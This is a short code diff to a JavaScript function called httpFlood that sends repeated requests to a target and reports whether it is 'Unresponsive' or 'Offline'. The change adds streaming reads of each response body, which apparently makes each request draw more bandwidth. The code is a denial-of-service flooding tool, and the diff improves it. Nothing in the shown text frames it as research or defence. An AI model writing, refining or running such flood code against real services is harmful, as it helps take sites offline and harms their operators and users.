@@ -40,9 +40,31 @@ async function httpFlood(target, duration, intensity) {
             if (contentLength) {
               mbps += parseInt(contentLength) / 1000000;
             }
+          
             if (!response.ok) {
               targetStatus = 'Unresponsive';
             }
+            return response.body;
+          })
+          .then(body => {
+              if(body){
+                  const reader = body.getReader();
+                  return new ReadableStream({
+                      start(controller) {
+                          function push() {
+                              reader.read().then(({ done, value }) => {
+                                  if (done) {
+                                      controller.close();
+                                      return;
+                                  }
+                                  controller.enqueue(value);
+                                  push();
+                              });
+                          }
+                          push();
+                      }
+                  })
+              }
           })
           .catch(error => {
             targetStatus = 'Offline';
